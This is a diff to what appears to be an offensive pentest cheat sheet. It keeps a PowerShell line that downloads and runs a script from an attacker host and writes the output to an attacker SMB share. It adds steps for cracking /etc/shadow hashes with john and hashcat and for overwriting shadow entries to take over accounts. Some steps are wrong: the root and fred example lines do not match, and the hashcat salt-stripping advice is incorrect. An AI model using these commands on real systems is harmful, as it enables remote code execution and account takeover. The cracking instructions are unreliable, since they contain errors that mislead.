@@ -374,5 +374,28 @@ On Windows, run an smb server to listen for the inbound output from the tool
 
 <code>PS > IEX (new-object net.webclient).downloadstring('http://[attackerip:port]/enum.ps1') > \\[attackerip]\smb\output.txt</code>
  
- 
+### /etc/shadow - cracking and overwriting
 
+#### copy hash from the second position (: delimited) and crack it:
+
+<code>root:$6$5l70Gupv$xBTxhCSexudn5jJ9hampIfTK0KIR3nqK1K1Rxye.OA5obtKArO7jgftjJtVSdp31MPxItEPmOuWhbgBvp0wqn.:16737:0:99999:7:::</code> you want the <code>fred:$6$5l70Gupv$xBTxhCSexudn5jJ9hampIfTK0KIR3nqK1K1Rxye.OA5obtKArO7jgftjJtVSdp31MPxItEPmOuWhbgBvp0wqn.:16737:0:99999:7:::</code> part
+
+use john to crack it: 
+<code> john --format=sha512crypt --wordlist=pathtowordlist hash.txt </code>
+
+to crack with hashcat... you need to remove the salt from the hash first:
+
+<code>$6$5l70Gupv$</code> is the salt, so the remaining part of the hash you want is 
+<code>xBTxhCSexudn5jJ9hampIfTK0KIR3nqK1K1Rxye.OA5obtKArO7jgftjJtVSdp31MPxItEPmOuWhbgBvp0wqn.</code>
+ 
+<code>hashcat -m 1800 hashfile /usr/share/wordlists/rockyou.txt --force</code>
+
+#### overwriting
+
+If you can write to /etc/shadow in some way, you can edit the pw hash for any account and the login with it
+
+~~~
+mkpasswd -m sha-512 password
+$6$Pp.gr7cKYj679e87$U8OdJicmXGASzEhI.QGHNBMg2/JIgA8j8bSGB2pl7nE4ZFLcvjT58qhbAZq42mB0mtO2OztIFTuQaKSeqQO7h1
+~~~
+copy the new password hash to the second field of any user in the shadow file and login with that password you've just created
